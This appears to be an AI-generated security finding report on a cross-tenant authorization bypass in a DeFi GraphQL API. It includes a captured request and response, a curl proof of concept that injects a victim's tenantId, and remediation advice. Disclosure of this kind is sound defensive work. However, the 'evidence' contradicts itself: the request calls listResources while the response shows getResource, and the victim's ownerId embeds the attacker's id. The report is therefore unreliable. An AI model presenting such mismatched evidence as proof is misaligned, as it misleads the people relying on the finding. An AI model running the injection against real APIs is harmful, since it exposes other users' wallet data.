# Security Analysis Report
**System:** ChainVault DeFi API (Blockchain / DeFi)
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** GQL-0235 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Injection / Pattern 5.1 | Authorization-bypass injection — attacker injects victim `tenantId` into `listResources` to bypass authorization and retrieve cross-tenant DeFi wallet data |

---

## Finding 1 — Authorization-Bypass Injection via `tenantId` Parameter (CRITICAL)

### Summary
The `listResources` resolver on ChainVault DeFi API (`api.chainvault-defi-api.example.com`) accepts a `tenantId` parameter directly from the client query without validating it against the authenticated user's JWT claims. Per §5.0 Pattern 5.1, this constitutes authorization-bypass injection: the attacker injects a victim's `tenantId` (`tenant-c321`) directly into the authorization-sensitive `tenantId` filter parameter, bypassing the intended scope restriction that should limit results to the authenticated user's tenant. The injected value causes the resolver to return DeFi wallet and portfolio data belonging to `tenant-c321`.

**Pattern:** 5.1 — Authorization-bypass injection (Injection)
**Affected resolver:** `listResources(tenantId: ID, status: String): [Resource!]`
**Affected endpoint:** `POST https://api.chainvault-defi-api.example.com/graphql`

### Evidence from HAR

**Request (attacker `tenant-d9b1`):**
```
POST https://api.chainvault-defi-api.example.com/graphql HTTP/2.0
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-d9b1
Content-Type: application/json

{"query": "query VulnerableOp { listResources(tenantId: \"tenant-c321\") { resourceId ownerId data { sensitiveField } } }"}
```

**Response (200 OK):**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-c321",
      "ownerId": "other-user-d9b1c321",
      "data": {
        "sensitiveField": "CONFIDENTIAL-d9b1c321",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

**x-request-id:** `req-d9b1c321`

The attacker injects `tenant-c321` into the `tenantId` parameter — a parameter the server should derive from the JWT, not accept from the client. In a DeFi platform, this exposes wallet addresses, token balances, transaction histories, and smart contract interactions belonging to another tenant.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 RISK-GQL-235 | Resolver gap | `tenantId` from client, not JWT | Root cause |
| §5.0 Pattern 5.1 | Vulnerability | Authorization-bypass injection | Classification |
| HAR request | injected `tenantId` | `tenant-c321` | Injected victim tenant ID |
| HAR request | `x-tenant-id` | `tenant-d9b1` | Authenticated attacker tenant |
| HAR response | `tenantId` | `tenant-c321` | Victim tenant confirmed |
| HAR response | `sensitiveField` | `CONFIDENTIAL-d9b1c321` | DeFi wallet/portfolio data leaked |
| HAR response | `ownerId` | `other-user-d9b1c321` | Victim user confirmed |
| HAR headers | `x-request-id` | `req-d9b1c321` | Correlation ID |

### Steps to Reproduce

**Step 1 — Obtain attacker JWT (tenant-d9b1):**
```bash
ATTACKER_JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
```

**Step 2 — Inject victim tenantId to bypass authorization (VULNERABLE):**
```bash
curl -s -X POST https://api.chainvault-defi-api.example.com/graphql \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -H "x-tenant-id: tenant-d9b1" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { listResources(tenantId: \"tenant-c321\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}' \
  | jq '.data.listResources'
# Expected VULNERABLE output: tenant-c321 DeFi wallet data with CONFIDENTIAL-d9b1c321
```

**Step 3 — Secure baseline (expected after fix):**
```bash
# Server derives tenantId from JWT, ignores query arg
# Response: results scoped to tenant-d9b1 only (attacker's own empty tenant)
```

### Remediation

1. **Ignore client-supplied `tenantId`:** Always derive from JWT: `const tenantId = context.auth.tenantId;`
2. **Remove or restrict `tenantId` in `listResources` schema** — treat as server-derived only.
3. **Input injection hardening:** Treat all GraphQL arguments that mirror authorization-sensitive values (tenantId, userId, role) as injection vectors — always override with JWT claims.
4. **DeFi-specific:** Wallet addresses and token balances are financial identity — unauthorized access constitutes financial surveillance; implement strict access logging.
5. **Fix Redis cache key:** Include `tenantId` (§2.0 gap).
